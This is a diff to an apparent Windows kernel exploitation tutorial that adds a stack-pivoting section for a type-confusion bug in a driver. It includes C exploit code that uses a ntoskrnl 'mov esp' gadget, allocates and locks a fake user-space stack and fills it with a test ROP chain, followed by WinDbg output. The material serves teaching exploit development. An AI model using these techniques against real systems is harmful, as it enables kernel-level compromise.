@@ -219,7 +219,7 @@ We can use [RP++](https://github.com/0vercl0k/rp) to gather useful ROP gadgets f
 rp-win.exe -r 5 -f .\ntoskrnl.exe --va 0x0 > gadgets.txt
 ```
 
-I generally use [Notepad++](https://notepad-plus-plus.org) to search for useful gadgets. We can find a `ret` gadget and place it in our exploit code (replacing the call to our user space shellcode):
+I generally use [Notepad++](https://notepad-plus-plus.org) to search for useful gadgets. We can find a `ret` gadget (otherwise known as a **ROP NOP**) and place it in our exploit code (replacing the call to our user space shellcode):
 
 ```c
 userData.ObjectType = (ULONG_PTR)kernelBase + 0x639131;
@@ -271,9 +271,98 @@ QWORD INT3 = kernelBase + 0x852b70;                             // int3; ret;
 
 ## Stack Pivoting
 
-todo
+Because we can only execute one gadget we need to execute something that can allow is to execute a ROP chain in kernel mode, where the ROP gadgets are in kernel space. In order to do this we need to pivot the stack with our single gadget to a fake user space stack where we can put our ROP chain.
 
-## Return Oriented Programming
+<img width="1059" alt="Screenshot 2024-08-26 at 16 35 32" src="https://github.com/user-attachments/assets/3605c86a-79ad-402e-8a84-cc7279bddf6f">
+
+The first thing we need to do is locate a suitable `mov esp` gadget. For it to be suitable it should allign to 16 bytes (essentially end with `0`). We can search `ntsokrnl.exe` for this. When one is allocated we can allocate the user space memory, lock it in, and execute it:
+
+```c
+// stack pivoting gadgets/values
+QWORD STACK_PIVOT_ADDR = 0xF6000000;
+QWORD MOV_ESP = kernelBase + 0x28bdbb;          // mov esp, 0xF6000000; ret;
+
+// prepare the new stack
+QWORD stackAddr = STACK_PIVOT_ADDR - 0x1000;
+LPVOID stack = VirtualAlloc((LPVOID)stackAddr, 0x14000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+printf("[+] User space stack, allocated address: 0x%p\n", stack);
+
+if (stack == 0x0)
+{
+  printf("[!] Error using VirtualAlloc. Error code: %u\n %u\n", GetLastError());
+  return 1;
+}
+
+printf("[+] VirtualLock, address: 0x%p\n", stack);
+if (!VirtualLock((LPVOID)stack, 0x14000)) {
+  printf("[!] Error using VirtualLock. Error code: %u\n %d\n", GetLastError());
+  return 1;
+}
+```
+
+We have located a `mov esp` gadget that will pivot the stack to `0xf6000000`. We allocate memory at this location `-0x1000` and we allocate `0x14000` bytes for the size of the stack. The Kernel will write to the space before and after our ROP chain (fake stack) so we need to ensure we allocate this.
+
+We also use the `VirtualLock` Win32 API. This ensures that the virtual memory is committed to physical memory and will not generate a page fault. Generating a page fault will cause a BSOD, we do not want that.
+
+If we run our exploit now it will BSOD, so let's put something on the ROP chain and debug it:
+
+```c
+int index = 0;
+
+// test rop chain
+QWORD* rop = (QWORD*)((QWORD)STACK_PIVOT_ADDR);
+
+// trigger a break
+*(rop + index++) = INT3;
+
+// some rop nops to examine
+for (int i = 0; i < 50; i++)
+  *(rop + index++) = ROP_NOP;
+
+// ...
+
+// allocate the userObject
+USER_TYPE_CONFUSION_OBJECT userObject = { 0 };
+userObject.ObjectID = (ULONG_PTR)0x4141414141414141;            // junk
+userObject.ObjectType = (ULONG_PTR)MOV_ESP;                     // the gadget to execute
+
+// trigger the bug
+DeviceIoControl(hDriver, 0x222023, (LPVOID)&userObject, sizeof(userObject), NULL, 0, NULL, NULL);
+```
+
+We can compile the code and run it on the target with **WinDbg** attached to the Kernel:
+
+```
+Break instruction exception - code 80000003 (first chance)
+nt!ExpQuerySystemInformation$filt$41+0xa:
+fffff800`11252b70 cc              int     3
+```
+
+We hit the breakpoint on our ROP chain. Let's take a look at the stack:
+
+```
+1: kd> dq rsp
+00000000`f6000008  fffff800`11039131 fffff800`11039131
+00000000`f6000018  fffff800`11039131 fffff800`11039131
+00000000`f6000028  fffff800`11039131 fffff800`11039131
+00000000`f6000038  fffff800`11039131 fffff800`11039131
+00000000`f6000048  fffff800`11039131 fffff800`11039131
+00000000`f6000058  fffff800`11039131 fffff800`11039131
+00000000`f6000068  fffff800`11039131 fffff800`11039131
+00000000`f6000078  fffff800`11039131 fffff800`11039131
+```
+
+This shows all of our **nop rops**. Also notice where `rsp` points to now:
+
+```
+1: kd> r rsp
+rsp=00000000f6000008
+```
+
+This is pointing in our user space stack. In the next section we will look at what we can do to defeat SMEP in our ROP chain, and `ret` to shellcode in user space.
+
+## Disabling SMEP
 
 todo
 
